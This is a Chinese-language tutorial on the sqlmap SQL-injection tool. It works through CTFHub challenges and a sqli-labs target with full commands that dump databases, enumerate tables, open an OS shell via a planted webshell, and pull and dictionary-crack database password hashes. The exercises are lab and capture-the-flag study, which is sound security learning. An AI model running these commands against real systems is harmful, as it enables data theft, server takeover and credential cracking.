# sqlmap工具的简单使用

*管他黑猫白猫，能抓老鼠就是好猫*

[^如果在赛程上遇到不会的sql注入 但是却有sqlmap，那无疑是一件天大的喜事]: ——Neko205

## 软件安装

`git clone https://github.com/sqlmapproject/sqlmap.git`

## sql注入分类

想要找到漏洞我们就要找到可以出现的漏洞点，依据注入点分类可以分为：

1. 数字型
2. 字符型
3. 搜索型

以及提交方式的分类

1. get注入
2. post注入
3. cookie注入
4. http头注入

还有基于信息获取的分类

1. 布尔注入
2. 时间注入
3. 报错注入
4. union联合查询注入

个人体感而言，前两者相对常见，可能是受制于技术原因，我并没有挖掘出过cookie与http头注入

更加具体的详解将在sql手动注入中详细阐述

## sqlmap工具的使用

一个最简单的使用方法

`sqlmap -u http://119.91.207.168/sqlilabs/Less-8/?id=1`

-u 确定要测试的url

实测这种最无脑的使用方式能打到sqli-lab靶场第九层

既然能确定漏洞了，那么如何提取数据，这里我们使用ctfhub的几道题目说明

##  [CTFHUB]整数型注入

 使用：

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" `

![](https://picdl.sunbangyan.cn/2023/11/27/54755727fff9dbabfd98be5a13b71dfa.jpeg)

我们可以看到sqlmap获取到了两种数据获取方式

一个是基于时间的盲注，另一个则是union联合查询注入，暂时先不管这两个我们只要知道，它可以注入。

这里我们可以使用暴力一点的方式，sqlmap中有一个命令--dump在不添加参数的情况下他会默认导出当前数据库的所有条目

在通过grep命令过滤，我们就可以较为精确的获取自己感兴趣的信息

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" -dump | grep ctfhub`

![](https://picdl.sunbangyan.cn/2023/11/27/d3df37a364c6a23250557e2d6fa52489.jpeg)

~~当然你也可以再暴力一点直接使用dump-all 或者直接--all~~

其实也有不那么暴力的方式，先通过-dbs枚举出所有数据库

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" -dbs`

![](https://picst.sunbangyan.cn/2023/11/28/3c2996e45e6a039daf0b374a3dbeaaa4.jpeg)

这里我们看到出现了一个我们感兴趣的数据库，sqli，这里我们可以用-D来指定我们感兴趣的数据库，且使用-tables枚举出数据库中的所有表。

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" -D sqli -tables`

![](https://picst.sunbangyan.cn/2023/11/28/aa044f43be8524ac4c260b1c5f6485e4.jpeg)

可以看到flag表已经出来了，然后我们就可以很优雅的使用-T指定数据表再使用-dump导出数据表中的数据

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" -D sqli -tables -T flag -dump`

![](https://picdm.sunbangyan.cn/2023/11/28/962c8a7bb885286cbafc8c62c08a06ba.jpeg)

得到flag

ctfhub{4aff866bac2652f563ab9dff}

## [CTFHUB]字符型注入

这题也是需要我们取得flag，但我们也可以试试看能不能获取别的敏感数据，不过我们先以最快的速度获取下flag

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" -dump | grep ctfhub`

![](https://picdl.sunbangyan.cn/2023/11/28/5a1ab69291dfcc8801a2eabe1074aa07.jpeg)

### 1.sqlmap --os-shell

某些数据库， 在某种情况下数据库通过某种方法能够直接执行系统命令，sqlmap则可以直接实现这个功能，os-shell的具体实现我们先不讨论，我们先看以下他的效果

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" --os-shell`

![](https://picdm.sunbangyan.cn/2023/11/28/d2cc3b76b06433e49026e26e93c49778.jpeg)

在使用命令后map会先问我们需要使用那种语言——在mysql数据库下os-shell本质是通过写入webshell来达到执行命令；第二个选项确定网页在服务器上的绝对路径，一般情况下这里会用到服务器泄漏的路径，但也可以使用默认列表试试运气，或者直接使用第四个选项进行暴力搜索

![](https://picst.sunbangyan.cn/2023/11/28/51d7abedb3e612b80fd9f2176962b03b.jpeg)

成功注入后我们就可以按照正常渗透的思路执行shell命令。

### 获得数据库用户名与密码

在sqlmap可以使用--users，--passwords来获得数据库的用户与密码

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" --users`

--users

![](https://picst.sunbangyan.cn/2023/11/28/2b21565b5484bc48fa90476f6ae05dfd.jpeg)

--passwords

`sqlmap -u "http://challenge-a4d216f6c4a908a1.sandbox.ctfhub.com:10800/?id=1" --passwords`

![](https://picdl.sunbangyan.cn/2023/11/28/d19c16c9bd40b9e18e1126c6679e8747.jpeg)

第一个选项是问***是否要将哈希值存储到临时文件中，以便最终使用其他工具进行进一步处理*** 

第二个选项是问***是否要对检索到的密码哈希执行基于字典的攻击***

第三个选项是问***要使用什么字典文件***

第四个选项是问***是否要使用常用密码后缀***

按照需求选择 ，~~一般情况下无脑下一步就行~~

